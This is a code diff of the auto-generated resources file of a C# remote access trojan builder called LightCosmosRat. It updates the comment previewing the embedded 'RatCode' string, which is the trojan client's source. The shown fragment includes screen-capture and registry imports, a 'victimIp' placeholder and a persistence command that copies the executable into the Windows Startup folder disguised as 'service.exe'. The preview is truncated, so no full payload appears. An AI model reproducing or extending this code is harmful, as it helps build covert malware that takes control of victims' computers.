@@ -62,19 +62,21 @@ namespace LightCosmosRat.Properties {
         
         /// <summary>
         ///   Cerca una stringa localizzata simile a using System;
-        ///using System.Net;
         ///using System.Net.Sockets;
-        ///namespace LightCosmosRat{
-        ///	class CosmosRat{
-        ///		int Port = STD_PORT;
-        ///		IPAddress Ip = STD_IP;
-        ///		static void Main(string[] args){
-        ///			Console.WriteLine(&quot;Avviato con successo&quot;);
-        ///			Console.WriteLine(&quot;VALORE PORTA: {0}&quot;,Port);
-        ///			Console.WriteLine(&quot;Indirizzo Ip:&quot;,Ip.ToString());
-        ///		}
-        ///	}
-        ///}.
+        ///using System.Threading;
+        ///using System.Drawing;
+        ///using System.Windows.Forms;
+        ///using System.Runtime.Serialization.Formatters.Binary;
+        ///using System.Drawing.Imaging;
+        ///using System.IO;
+        ///using Microsoft.Win32;
+        ///namespace ClientRatv3
+        ///{
+        ///    class Program
+        ///    {
+        ///        public const string DefaultPath= &quot;copy \&quot;ClientRat_cs.exe\&quot; \&quot;%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\service.exe\&quot;&quot;;
+        ///        public const string victimIp = &quot;STD_IP&quot;;
+        ///        public [stringa troncata]&quot;;.
         /// </summary>
         internal static string RatCode {
             get {
